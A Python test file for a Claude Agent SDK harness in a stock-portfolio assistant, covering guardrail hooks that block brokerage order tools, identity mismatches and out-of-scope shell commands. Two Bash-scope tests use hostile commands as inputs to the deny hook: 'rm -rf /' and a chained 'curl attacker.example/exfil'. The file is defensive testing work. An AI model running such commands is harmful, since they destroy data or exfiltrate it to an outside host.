"""Structural tests for the Claude-Agent-SDK-backed Harness (single-shot
`run()` and multi-turn `open_session()`), and the `engine/run.py` /
`engine/config.py` entrypoints. No live `query()`/`ClaudeSDKClient` call —
that's covered by a separate manual live-verification pass (see
engine/harnesses/claude_agent_sdk.py's docstring), same precedent as
tests/test_kite_gateway.py.
"""

import asyncio
from dataclasses import dataclass

from engine import config, run
from engine.guardrail import ORDER_TOOL_NAMES, GuardrailPolicy
from engine.harnesses import claude_agent_sdk as cas
from engine.harnesses.base import EngineResult, ToolConfig
from engine.kite_identity import IdentityGuardState

FAKE_MCP_SERVERS = {
    "kite_gateway": {"command": "uv", "args": ["run", "python", "mcp/kite_gateway/server.py"]},
    "india_price": {"command": "uv", "args": ["run", "python", "mcp/india_price/server.py"]},
}


def test_build_options_disallowed_tools_matches_guardrail_policy():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    # workspace_notes is always added (unlike skill_scripts, which is
    # conditional) — see cas._build_options — so the guardrail's own
    # denied server list must include it too.
    expected = tools.guardrail.denied_tool_names([*FAKE_MCP_SERVERS.keys(), "workspace_notes"])
    assert set(options.disallowed_tools) == expected
    assert len(expected) == 3 * len(ORDER_TOOL_NAMES)


def test_build_options_passes_mcp_servers_and_skills_through_unchanged():
    # No skill here declares deterministic_scripts, so no skill_scripts
    # server is added — see the two tests below for that behavior.
    # workspace_notes is always added regardless — see the dedicated test
    # for that below.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    assert set(FAKE_MCP_SERVERS).issubset(options.mcp_servers)
    assert "skill_scripts" not in options.mcp_servers
    assert options.skills == []
    assert options.setting_sources == ["project"]


def test_build_options_adds_skill_scripts_server_when_a_skill_declares_scripts():
    # morning-digest's real SKILL.md declares deterministic_scripts (see
    # .claude/skills/morning-digest/SKILL.md) — this reads the real
    # frontmatter, not a fake, since the whole point is proving the wiring
    # from a real skill's declaration into the actual options object.
    # morning-digest also declares `stages` now, which is a separate
    # concern (see the staged_workflows tests below) — deterministic
    # scripts still build into skill_scripts regardless, since each
    # stage's own session needs run_digest_math etc. too.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["morning-digest"])
    options = cas._build_options(tools)

    assert set(FAKE_MCP_SERVERS).issubset(options.mcp_servers)
    assert "skill_scripts" in options.mcp_servers


def test_build_options_exposes_a_staged_skill_only_through_its_own_tool():
    # docs/staged-skill-execution-design.md §8's first requirement: a
    # staged skill must never also be in the native skill list, so the
    # model never has a choice between two paths to the same skill.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["morning-digest"])
    options = cas._build_options(tools)

    assert "morning-digest" not in options.skills
    assert "staged_workflows" in options.mcp_servers


def test_build_options_omits_staged_workflows_server_for_a_skill_without_stages():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["red-flag-scan"])
    options = cas._build_options(tools)

    assert options.skills == ["red-flag-scan"]
    assert "staged_workflows" not in options.mcp_servers


def test_build_options_suppresses_staged_workflows_server_when_flagged_off():
    # The flag a stage's own inner session is opened with (see
    # engine/staged_skills.py) — prevents a stage from seeing
    # run_staged_morning_digest and recursively re-triggering itself.
    tools = ToolConfig(
        mcp_servers=FAKE_MCP_SERVERS,
        guardrail=GuardrailPolicy(),
        skills=["morning-digest"],
        include_staged_tools=False,
    )
    options = cas._build_options(tools)

    assert "staged_workflows" not in options.mcp_servers
    # native skill list still excludes it too -- the body is sent as
    # shared context in the prompt itself (§4), not via native
    # Skill-invocation, regardless of this flag.
    assert "morning-digest" not in options.skills


def test_build_options_routes_any_stages_declaring_skill_not_just_morning_digest(tmp_path, monkeypatch):
    # docs/staged-skill-execution-design.md §10 step 3: proves the staged
    # routing above isn't secretly keyed off the literal string
    # "morning-digest" anywhere -- a second, synthetic skill with its own
    # `stages` block gets identical treatment from a real SKILLS_ROOT read.
    import engine.skills as skills_module

    skill_dir = tmp_path / "widget-digest"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(
        "---\nname: widget-digest\ndescription: test\n"
        "stages:\n  - id: only_stage\n    instructions: do the one thing\n---\n\nBody.\n"
    )
    monkeypatch.setattr(skills_module, "SKILLS_ROOT", tmp_path)

    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["widget-digest"])
    options = cas._build_options(tools)

    assert "widget-digest" not in options.skills
    assert "staged_workflows" in options.mcp_servers


def test_build_options_omits_skill_scripts_server_when_no_skill_declares_scripts():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    assert "skill_scripts" not in options.mcp_servers


def test_build_options_always_adds_workspace_notes_server():
    # Unlike skill_scripts, this isn't gated on any skill declaring
    # anything — every skill in every workspace shares the same one
    # notes.md convention.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)

    assert "workspace_notes" in options.mcp_servers


def test_build_options_defaults_leave_tools_and_buffer_size_unset():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.tools is None
    assert options.max_buffer_size is None


def test_build_options_threads_builtin_tools_and_max_buffer_size_when_set():
    tools = ToolConfig(
        mcp_servers=FAKE_MCP_SERVERS,
        guardrail=GuardrailPolicy(),
        skills=[],
        builtin_tools=["Read", "Write", "Bash"],
        max_buffer_size=10_000_000,
    )
    options = cas._build_options(tools)
    assert options.tools == ["Read", "Write", "Bash"]
    assert options.max_buffer_size == 10_000_000


def test_build_options_scopes_strictly_to_configured_mcp_servers():
    # Without strict_mcp_config, a session was found live to also pick up
    # whatever MCP servers are configured globally on the host machine (an
    # unrelated personal connector showed up unprompted) — the same class of
    # leak as skills="all" pulling in host-level skills.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.strict_mcp_config is True


def test_build_options_bypasses_interactive_permission_prompts():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.permission_mode == "bypassPermissions"


def test_build_options_sets_kite_login_read_only_system_prompt():
    # vision.md §8's inline read-only guarantee — this is the one always-on
    # instruction in the engine, so it must survive regardless of which (if
    # any) skill is configured. See cas._KITE_LOGIN_SYSTEM_PROMPT's comment
    # for why this lives in system_prompt rather than a skill's SKILL.md.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])
    options = cas._build_options(tools)
    assert options.system_prompt == cas._KITE_LOGIN_SYSTEM_PROMPT
    assert "read-only" in cas._KITE_LOGIN_SYSTEM_PROMPT


def test_build_options_wires_a_pretooluse_hook():
    # Three PreToolUse hooks: order-tool denial, Bash-scope denial, and
    # the identity-mismatch deny hook (issue #19). Tool-call budgets
    # (engine/tool_budget.py) are audit-only — counted inside
    # ClaudeSession.send() itself, not a PreToolUse hook — so they add no
    # extra hook here. See tool_budget.py's own docstring for why a hard
    # deny hook was tried and dropped there specifically.
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills="all")
    options = cas._build_options(tools)

    assert "PreToolUse" in options.hooks
    assert len(options.hooks["PreToolUse"]) == 1
    assert len(options.hooks["PreToolUse"][0].hooks) == 3


def test_build_options_wires_a_posttooluse_hook_for_identity_recording():
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills="all")
    options = cas._build_options(tools)

    assert "PostToolUse" in options.hooks
    assert len(options.hooks["PostToolUse"]) == 1
    assert len(options.hooks["PostToolUse"][0].hooks) == 1


def test_open_session_gives_the_session_a_budget_tracker_built_from_real_skills(monkeypatch):
    # Real morning-digest SKILL.md declares india_news.get_news's budget —
    # proves open_session() reads it into the session's own tracker (used
    # for audit only, never to block a call).
    class _FakeClient:
        async def connect(self):
            pass

        async def get_mcp_status(self):
            return {"mcpServers": []}

        async def disconnect(self):
            pass

    monkeypatch.setattr(cas, "ClaudeSDKClient", lambda options: _FakeClient())

    harness = cas.ClaudeAgentSDKHarness()
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=["morning-digest"])

    async def _open_and_check():
        async with harness.open_session(tools) as session:
            assert session._budget_tracker._budgets == {("india_news", "get_news"): 25}

    asyncio.run(_open_and_check())


def test_run_threads_workspace_root_and_folds_the_footer_into_the_returned_text(tmp_path, monkeypatch):
    # Live-found 2026-08-08: engine/run.py's single-shot path had no way to
    # turn on auto-capture/the Sources footer at all, and even once
    # workspace_root is threaded through, run() used to return
    # session.last_result.text -- the SDK's own raw final message, which
    # never includes the footer (see ClaudeSession.send: the footer is one
    # more streamed chunk, yielded after last_result is already set). This
    # proves both halves of the fix: the flag reaches send(), and the
    # accumulated chunks (with footer) are what actually comes back.
    @dataclass
    class TextBlock:
        text: str

    @dataclass
    class ToolUseBlock:
        id: str
        name: str
        input: dict

    @dataclass
    class ToolResultBlock:
        tool_use_id: str
        content: object = None
        is_error: bool | None = None

    @dataclass
    class AssistantMessage:
        content: list

    @dataclass
    class UserMessage:
        content: list

    @dataclass
    class ResultMessage:
        subtype: str
        result: str | None = None

    messages = [
        AssistantMessage(content=[
            ToolUseBlock(id="t1", name="mcp__india_price__get_quote", input={"symbols": ["RELIANCE"]}),
        ]),
        UserMessage(content=[ToolResultBlock(tool_use_id="t1", content='{"data": {}}')]),
        AssistantMessage(content=[TextBlock(text="RELIANCE is trading flat today.")]),
        ResultMessage(subtype="success", result="RELIANCE is trading flat today."),
    ]

    class _FakeClient:
        async def connect(self):
            pass

        async def get_mcp_status(self):
            return {"mcpServers": []}

        async def disconnect(self):
            pass

        async def query(self, prompt):
            pass

        async def receive_response(self):
            for message in messages:
                yield message

    monkeypatch.setattr(cas, "ClaudeSDKClient", lambda options: _FakeClient())
    workspace_root = tmp_path / "ws"
    (workspace_root / "data").mkdir(parents=True)

    harness = cas.ClaudeAgentSDKHarness()
    tools = ToolConfig(mcp_servers=FAKE_MCP_SERVERS, guardrail=GuardrailPolicy(), skills=[])

    result = asyncio.run(harness.run("what's the RELIANCE quote?", tools, workspace_root=workspace_root))

    assert result.ok is True
    assert "RELIANCE is trading flat today." in result.text
    assert "Sources" in result.text  # the footer, only reachable via accumulated chunks, not last_result alone
    assert "india_price" in result.text


def test_deny_hook_denies_order_tools_and_allows_safe_tools():
    policy = GuardrailPolicy()
    hook = cas._build_deny_hook(policy)

    denied = asyncio.run(hook({"tool_name": "mcp__kite_gateway__place_order"}, "tool-use-1", {}))
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"

    allowed = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_holdings"}, "tool-use-2", {}))
    assert allowed == {}


def test_identity_deny_hook_denies_gated_tools_only_after_a_confirmed_mismatch():
    state = IdentityGuardState()
    hook = cas._build_identity_deny_hook(state)

    # No check has happened yet this session — deliberately still allowed,
    # see engine/kite_identity.py's docstring for why "unchecked" isn't
    # grounds for a hard deny.
    allowed = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_holdings"}, "tool-use-1", {}))
    assert allowed == {}

    state.mismatch = True
    denied = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_holdings"}, "tool-use-2", {}))
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"

    denied_positions = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_positions"}, "tool-use-3", {}))
    assert denied_positions["hookSpecificOutput"]["permissionDecision"] == "deny"

    # A tool this hook doesn't gate stays unaffected even after a mismatch.
    unaffected = asyncio.run(hook({"tool_name": "mcp__kite_gateway__get_margins"}, "tool-use-4", {}))
    assert unaffected == {}


def test_identity_record_hook_only_reacts_to_get_profile(monkeypatch, tmp_path):
    from engine import kite_status

    monkeypatch.setattr(kite_status, "ACCOUNT_IDENTITY_FILE", tmp_path / "account_identity.json")
    (tmp_path / "account_identity.json").write_text('{"source": "kite", "data": {"user_id": "AB1234"}}')

    state = IdentityGuardState()
    hook = cas._build_identity_record_hook(state)

    # Not get_profile — no-op regardless of tool_response shape.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_holdings", "tool_response": {"data": {"user_id": "ZZ9999"}}},
            "tool-use-1",
            {},
        )
    )
    assert state.mismatch is False

    # get_profile, matching account — no mismatch.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_profile", "tool_response": {"data": {"user_id": "AB1234"}}},
            "tool-use-2",
            {},
        )
    )
    assert state.mismatch is False

    # get_profile, different account — confirmed mismatch.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_profile", "tool_response": {"data": {"user_id": "ZZ9999"}}},
            "tool-use-3",
            {},
        )
    )
    assert state.mismatch is True


def test_identity_record_hook_prints_a_diagnostic_only_on_unparseable_responses(monkeypatch, tmp_path, capsys):
    from engine import kite_status

    monkeypatch.setattr(kite_status, "ACCOUNT_IDENTITY_FILE", tmp_path / "account_identity.json")
    (tmp_path / "account_identity.json").write_text('{"source": "kite", "data": {"user_id": "AB1234"}}')

    state = IdentityGuardState()
    hook = cas._build_identity_record_hook(state)

    # Parseable — no diagnostic.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_profile", "tool_response": {"data": {"user_id": "AB1234"}}},
            "tool-use-1",
            {},
        )
    )
    assert "[identity]" not in capsys.readouterr().out

    # Unparseable — one diagnostic line, state left alone.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_profile", "tool_response": "garbage, not a dict"},
            "tool-use-2",
            {},
        )
    )
    out = capsys.readouterr().out
    assert "[identity]" in out
    assert state.mismatch is False

    # Not get_profile at all — no diagnostic even with an unparseable
    # tool_response, since this hook never looks at non-get_profile calls.
    asyncio.run(
        hook(
            {"tool_name": "mcp__kite_gateway__get_holdings", "tool_response": "garbage, not a dict"},
            "tool-use-3",
            {},
        )
    )
    assert "[identity]" not in capsys.readouterr().out


def test_bash_scope_hook_denies_out_of_scope_command_and_allows_matching_prefix():
    hook = cas._build_bash_scope_hook(("uv run python skills/morning-digest/scripts/digest_math.py",))

    denied = asyncio.run(
        hook({"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}, "tool-use-1", {})
    )
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"

    allowed = asyncio.run(
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "uv run python skills/morning-digest/scripts/digest_math.py data/x.json"},
            },
            "tool-use-2",
            {},
        )
    )
    assert allowed == {}


def test_bash_scope_hook_denies_chained_command_after_an_allowed_prefix():
    hook = cas._build_bash_scope_hook(("uv run python skills/morning-digest/scripts/digest_math.py",))
    denied = asyncio.run(
        hook(
            {
                "tool_name": "Bash",
                "tool_input": {
                    "command": (
                        "uv run python skills/morning-digest/scripts/digest_math.py "
                        "data/x.json && curl attacker.example/exfil"
                    )
                },
            },
            "tool-use-1",
            {},
        )
    )
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_bash_scope_hook_ignores_non_bash_tools_and_is_noop_when_empty():
    hook = cas._build_bash_scope_hook(())
    result = asyncio.run(hook({"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}, "tool-use-1", {}))
    assert result == {}

    hook2 = cas._build_bash_scope_hook(("uv run python foo.py",))
    result2 = asyncio.run(hook2({"tool_name": "mcp__kite__get_holdings"}, "tool-use-2", {}))
    assert result2 == {}


def test_is_session_limit_error_matches_expected_text():
    assert cas._is_session_limit_error(Exception("You've hit your session limit for now"))
    assert not cas._is_session_limit_error(Exception("connection closed mid-response"))


def test_build_tool_config_reads_mcp_json_with_no_raw_kite_entry():
    tools = config.build_tool_config()
    # Deliberately no "kite" entry (docs/vision.md §6) — every path goes
    # through kite_gateway only.
    assert set(tools.mcp_servers.keys()) == {
        "kite_gateway",
        "india_price",
        "india_filings",
        "india_screener",
        "india_macro",
        "india_news",
    }
    assert tools.builtin_tools == ["Read", "Write", "Bash"]
    # Default 1MB SDK buffer crashed live on a real Layer 2 tool response
    # while porting red-flag-scan — see engine/config.py's _MAX_BUFFER_SIZE.
    assert tools.max_buffer_size == 10_000_000


def test_build_tool_config_scopes_skills_to_minty_only():
    # Explicit list, not "all" — "all" also surfaces unrelated global/
    # user-level skills installed on the host machine.
    tools = config.build_tool_config()
    assert tools.skills == [
        "morning-digest",
        "portfolio-health-check",
        "red-flag-scan",
        "screen-indian-stocks",
        "thesis-tracker",
    ]


@dataclass
class _FakeHarness:
    """Satisfies the `Harness` protocol without touching claude_agent_sdk at
    all — proves engine/run.py's own logic depends only on the protocol,
    not the concrete ClaudeAgentSDKHarness class."""

    to_return: EngineResult

    async def run(self, prompt: str, tools: ToolConfig, *, workspace_root=None) -> EngineResult:
        self.last_prompt = prompt
        self.last_tools = tools
        self.last_workspace_root = workspace_root
        return self.to_return


def test_main_prints_result_text_and_returns_zero_on_success(tmp_path, monkeypatch):
    import engine.workspace as workspace_module

    monkeypatch.setattr(workspace_module, "WORKSPACE_ROOT", tmp_path / "workspace")
    fake = _FakeHarness(to_return=EngineResult(ok=True, text="all good", error_kind=None, raw=None))
    exit_code = asyncio.run(run._main("what's the RELIANCE quote?", harness=fake))
    assert exit_code == 0
    assert "what's the RELIANCE quote?" in fake.last_prompt


def test_main_returns_one_on_harness_failure(tmp_path, monkeypatch):
    import engine.workspace as workspace_module

    monkeypatch.setattr(workspace_module, "WORKSPACE_ROOT", tmp_path / "workspace")
    fake = _FakeHarness(to_return=EngineResult(ok=False, text=None, error_kind="other", raw=None))
    exit_code = asyncio.run(run._main("anything", harness=fake))
    assert exit_code == 1


def test_main_always_resolves_and_threads_the_active_workspace(tmp_path, monkeypatch):
    # docs/vision.md §5's grounding rule only actually applies when
    # workspace_root reaches Harness.run() -- this proves engine.run always
    # resolves the one fixed workspace (creating it if needed, same as
    # engine/interactive.py's own startup resolution) and both augments the
    # prompt (so the model isn't left guessing the path from prose) and
    # passes workspace_root through -- no opt-in flag, and no case where it
    # silently stays None (docs/next-phase-plan.md §4).
    import engine.workspace as workspace_module

    monkeypatch.setattr(workspace_module, "WORKSPACE_ROOT", tmp_path / "workspace")
    monkeypatch.delenv("MINTY_WORKSPACE", raising=False)
    fake = _FakeHarness(to_return=EngineResult(ok=True, text="ok", error_kind=None, raw=None))

    exit_code = asyncio.run(run._main("how's my portfolio?", harness=fake))

    assert exit_code == 0
    assert fake.last_workspace_root == tmp_path / "workspace"
    assert str(tmp_path / "workspace") in fake.last_prompt
    assert "how's my portfolio?" in fake.last_prompt
    assert (tmp_path / "workspace" / "data").is_dir()


def test_main_honors_minty_workspace_env_override(tmp_path, monkeypatch):
    import engine.workspace as workspace_module

    monkeypatch.setattr(workspace_module, "WORKSPACE_ROOT", tmp_path / "workspace")
    monkeypatch.setattr(workspace_module, "DEV_WORKSPACES_ROOT", tmp_path / ".dev-workspaces")
    monkeypatch.setenv("MINTY_WORKSPACE", "test-scratch")
    fake = _FakeHarness(to_return=EngineResult(ok=True, text="ok", error_kind=None, raw=None))

    asyncio.run(run._main("what's the RELIANCE quote?", harness=fake))

    assert fake.last_workspace_root == tmp_path / ".dev-workspaces" / "test-scratch"
